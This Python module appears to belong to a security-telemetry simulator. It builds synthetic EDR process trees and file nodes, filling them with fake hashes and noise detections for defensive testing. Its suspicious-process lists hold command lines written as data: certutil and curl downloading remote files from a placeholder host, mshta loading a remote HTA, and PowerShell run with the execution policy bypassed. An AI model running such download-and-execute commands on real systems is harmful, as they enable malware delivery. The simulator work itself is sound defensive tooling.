"""Process trees and file artifacts.

Low-level constructors (:func:`add_process`, :func:`spawn`, :func:`file_node`, :func:`executed`) build the
``Process``/``File`` nodes and the ``RAN_ON`` / ``RAN_AS`` / ``SPAWNED`` / ``EXECUTED`` edges the schema
expects. The storyline modules call these directly to script exact trees; :func:`generic_tree` builds a
plausible parent/child chain for a noise EDR detection so every alerted detection has runtime evidence.

Files carry an EDR-style ``verdict`` (``clean|suspicious|malicious``) but never a ``malware_family`` -- the
sensor does not attribute families; the threat-intel stage does.
"""
from __future__ import annotations

from typing import Any

from throughline.simulator.common import fake_sha256, rng
from throughline.simulator.events.ctx import Ctx, aid_of, file_id, process_id

# Reusable clean system-binary hashes (deterministic, stable ids)
SYS_HASHES = {
    "explorer.exe": fake_sha256("win", "explorer.exe"),
    "powershell.exe": fake_sha256("win", "powershell.exe"),
    "cmd.exe": fake_sha256("win", "cmd.exe"),
    "rundll32.exe": fake_sha256("win", "rundll32.exe"),
    "net.exe": fake_sha256("win", "net.exe"),
    "nltest.exe": fake_sha256("win", "nltest.exe"),
    "arp.exe": fake_sha256("win", "arp.exe"),
    "nslookup.exe": fake_sha256("win", "nslookup.exe"),
    "lsass.exe": fake_sha256("win", "lsass.exe"),
    "reg.exe": fake_sha256("win", "reg.exe"),
    "PSEXESVC.exe": fake_sha256("win", "PSEXESVC.exe"),
    "outlook.exe": fake_sha256("win", "outlook.exe"),
    "bash": fake_sha256("linux", "bash"),
    "sshd": fake_sha256("linux", "sshd"),
    "sudo": fake_sha256("linux", "sudo"),
    "cat": fake_sha256("linux", "cat"),
    "curl": fake_sha256("linux", "curl"),
    "sh": fake_sha256("linux", "sh"),
    "java": fake_sha256("linux", "java"),
}


def file_node(ctx: Ctx, *, sha256: str, file_name: str, file_path: str, verdict: str = "clean",
              size_bytes: int = 0, signed: bool = False, source: str = "falcon-sim") -> str:
    nid = file_id(sha256)
    if not ctx.has_node(nid):
        ctx.n(nid, "File", file_name, {
            "sha256": sha256, "file_name": file_name, "file_path": file_path, "size_bytes": size_bytes,
            "signed": signed, "malware_family": "", "verdict": verdict,
        }, source=source, source_id=sha256)
    return nid


def add_process(ctx: Ctx, *, endpoint_id: str, pid: int, image_path: str, command_line: str, user: str,
                start_time: str, sha256: str | None = None, parent_id: str | None = None,
                signed: bool = True, signer: str | None = None, integrity_level: str = "medium",
                end_time: str | None = None, source: str = "falcon-sim") -> str:
    aid = aid_of(endpoint_id)
    file_name = image_path.replace("\\", "/").rsplit("/", 1)[-1]
    sha = sha256 or SYS_HASHES.get(file_name, fake_sha256("proc", image_path))
    proc_id = process_id(aid, pid, start_time)
    ctx.n(proc_id, "Process", file_name, {
        "endpoint_id": endpoint_id, "pid": pid, "parent_process_id": parent_id, "image_path": image_path,
        "command_line": command_line, "user": user, "sha256": sha, "signed": signed, "signer": signer,
        "start_time": start_time, "end_time": end_time, "integrity_level": integrity_level,
    }, source=source, source_id=f"{aid}:{pid}", first_seen=start_time, last_seen=end_time or start_time)
    ctx.e("RAN_ON", proc_id, endpoint_id, source=source, first_seen=start_time, last_seen=start_time)
    return proc_id


def ran_as(ctx: Ctx, proc_id: str, principal_id: str, *, source: str = "falcon-sim") -> None:
    ctx.e("RAN_AS", proc_id, principal_id, source=source)


def spawn(ctx: Ctx, parent_id: str, child_id: str, *, source: str = "falcon-sim", when: str | None = None) -> None:
    ctx.e("SPAWNED", parent_id, child_id, source=source, first_seen=when, last_seen=when)


def executed(ctx: Ctx, proc_id: str, file_node_id: str, *, action: str = "executed",
             source: str = "falcon-sim", when: str | None = None) -> None:
    ctx.e("EXECUTED", proc_id, file_node_id, {"action": action}, source=source, first_seen=when, last_seen=when)


# --------------------------------------------------------------------- generic noise trees

_WIN_BENIGN = [
    ("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs", "NT AUTHORITY\\SYSTEM"),
    ("C:\\Windows\\explorer.exe", "explorer.exe", None),
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe", None),
]
_WIN_SUSPECT = [
    ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\IT\\scripts\\inventory.ps1", ["T1059.001"], "suspicious"),
    ("C:\\Windows\\System32\\wscript.exe", "wscript.exe C:\\Users\\Public\\update.vbs", ["T1059.005"], "suspicious"),
    ("C:\\Windows\\System32\\certutil.exe", "certutil -urlcache -split -f http://%s/tool.exe", ["T1105"], "suspicious"),
    ("C:\\Windows\\System32\\mshta.exe", "mshta.exe http://%s/a.hta", ["T1218.005"], "suspicious"),
    ("C:\\Users\\Public\\pup_installer.exe", "pup_installer.exe /silent", ["T1204.002"], "malicious"),
]
_NIX_SUSPECT = [
    ("/usr/bin/curl", "curl -fsSL http://%s/i.sh", ["T1105"], "suspicious"),
    ("/usr/bin/python3", "python3 -c 'import socket'", ["T1059.006"], "suspicious"),
    ("/bin/bash", "bash -c 'crontab -l'", ["T1053.003"], "suspicious"),
]


def generic_tree(ctx: Ctx, endpoint_id: str, *, os_family: str, user: str, detected_at: str,
                 namespace: str, malicious: bool = False, external_host: str | None = None,
                 principal_id: str | None = None) -> dict[str, Any]:
    """Build a small parent->child tree for a noise detection; return the primary process + techniques.

    ``principal_id`` -- when given (an id that exists in the inventory), a ``RAN_AS`` edge is added; omitted
    for server processes whose OS user has no graph principal, so no edge dangles.
    """
    r = rng(namespace)
    base_pid = r.randint(2000, 60000)
    if os_family == "windows":
        p_img, p_cmd, p_user = r.choice(_WIN_BENIGN)
        parent = add_process(ctx, endpoint_id=endpoint_id, pid=base_pid, image_path=p_img,
                             command_line=p_cmd, user=p_user or user, start_time=detected_at,
                             signer="Microsoft Corporation")
        img, cmd, techs, base_verdict = r.choice(_WIN_SUSPECT)
    else:
        parent = add_process(ctx, endpoint_id=endpoint_id, pid=base_pid,
                             image_path="/usr/lib/systemd/systemd", command_line="/usr/lib/systemd/systemd",
                             user="root", start_time=detected_at, signer="distro")
        img, cmd, techs, base_verdict = r.choice(_NIX_SUSPECT)
    if external_host and "%s" in cmd:
        cmd = cmd % external_host
    verdict = "malicious" if malicious else base_verdict
    child = add_process(ctx, endpoint_id=endpoint_id, pid=base_pid + r.randint(1, 400), image_path=img,
                        command_line=cmd, user=user, start_time=detected_at, parent_id=parent,
                        signed=False, integrity_level="medium")
    spawn(ctx, parent, child, when=detected_at)
    if principal_id:
        ran_as(ctx, child, principal_id)
    file_name = img.replace("\\", "/").rsplit("/", 1)[-1]
    fsha = fake_sha256("noise-file", namespace, img)
    fnode = file_node(ctx, sha256=fsha, file_name=file_name, file_path=img, verdict=verdict,
                      size_bytes=r.randint(4096, 4_000_000), signed=(verdict == "clean"))
    executed(ctx, child, fnode, action="executed", when=detected_at)
    return {"primary": child, "parent": parent, "file": fnode, "sha256": fsha, "file_name": file_name,
            "file_path": img, "command_line": cmd, "techniques": techs, "verdict": verdict}
